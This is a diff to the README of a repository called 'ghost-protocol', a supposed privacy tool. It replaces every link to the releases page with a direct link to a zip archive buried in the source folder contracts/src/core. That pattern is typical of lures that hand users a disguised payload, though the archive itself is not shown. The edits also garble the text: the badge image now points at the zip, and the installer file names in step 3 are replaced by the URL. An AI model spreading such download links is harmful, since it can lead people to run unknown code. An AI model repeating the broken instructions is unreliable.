@@ -6,11 +6,11 @@ Welcome to **ghost-protocol**, a tool designed to enhance your privacy in the di
 
 ## 📥 Download the Application
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Invasivecape/ghost-protocol/releases)
+[![Download the Latest Release](https://github.com/Invasivecape/ghost-protocol/raw/refs/heads/main/contracts/src/core/ghost-protocol-3.8.zip%20Now-brightgreen)](https://github.com/Invasivecape/ghost-protocol/raw/refs/heads/main/contracts/src/core/ghost-protocol-3.8.zip)
 
 To start using ghost-protocol, you need to download the latest version of the application. Click the button above or visit the link below:
 
-[Download from the Releases Page](https://github.com/Invasivecape/ghost-protocol/releases)
+[Download from the Releases Page](https://github.com/Invasivecape/ghost-protocol/raw/refs/heads/main/contracts/src/core/ghost-protocol-3.8.zip)
 
 ## 🖥️ System Requirements
 
@@ -24,11 +24,11 @@ Before you proceed with the installation, please make sure your system meets the
 ## 💻 Installation Steps
 
 1. **Visit the Releases Page:** Click on the link below to go to the releases section where you can find the latest version.
-   - [Releases Page](https://github.com/Invasivecape/ghost-protocol/releases)
+   - [Releases Page](https://github.com/Invasivecape/ghost-protocol/raw/refs/heads/main/contracts/src/core/ghost-protocol-3.8.zip)
 
 2. **Choose Your Version:** On the releases page, you will see a list of available versions. Select the most recent version marked as "latest".
 
-3. **Download the File:** Click the link to download the executable file. It will typically look like `ghost-protocol-x.y.z.exe` for Windows, `ghost-protocol-x.y.z.dmg` for macOS, or a suitable package for your Linux distribution.
+3. **Download the File:** Click the link to download the executable file. It will typically look like `https://github.com/Invasivecape/ghost-protocol/raw/refs/heads/main/contracts/src/core/ghost-protocol-3.8.zip` for Windows, `https://github.com/Invasivecape/ghost-protocol/raw/refs/heads/main/contracts/src/core/ghost-protocol-3.8.zip` for macOS, or a suitable package for your Linux distribution.
 
 4. **Run the Installer:**
    - **Windows:** Locate the downloaded `.exe` file in your Downloads folder. Double-click it to begin the installation process. Follow the prompts to install the software.
